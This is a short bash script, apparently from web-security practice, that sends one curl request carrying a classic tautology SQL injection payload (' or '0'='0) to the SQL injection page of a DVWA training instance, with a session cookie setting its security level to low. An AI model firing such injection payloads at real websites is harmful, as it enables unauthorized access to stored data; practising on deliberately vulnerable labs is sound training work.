#!/bin/bash

curl \
    --user-agent "lisy-sqli" \
    -v http://dvwa.rerand0m.ru/vulnerabilities/sqli/\?id\=%25%27+or+%270%27%3D%270\&Submit\=Submit\# \
    -b'PHPSESSID=d0dr5dqj0i8pagpoettd1hua23;security=low'